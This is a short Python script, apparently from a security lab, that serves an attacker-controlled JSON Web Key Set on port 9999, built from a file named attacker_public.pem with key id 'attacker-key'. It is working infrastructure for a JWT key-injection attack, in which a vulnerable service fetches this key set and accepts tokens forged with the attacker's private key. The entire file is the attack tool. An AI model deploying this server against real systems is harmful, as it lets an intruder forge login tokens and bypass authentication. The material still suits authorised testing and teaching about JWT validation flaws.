from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import json, base64

def int_to_base64(n):
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()

with open('../attacker_public.pem', 'rb') as f:
    pub_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

pub_numbers = pub_key.public_numbers()

jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "kid": "attacker-key",
        "alg": "RS256",
        "n": int_to_base64(pub_numbers.n),
        "e": int_to_base64(pub_numbers.e),
    }]
}

class JWKSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(jwks).encode())

    def log_message(self, format, *args):
        print(f"[JWKS Server] {args[0]} {args[1]}")

print("JWKS strežnik teče na http://localhost:9999/")
HTTPServer(('0.0.0.0', 9999), JWKSHandler).serve_forever()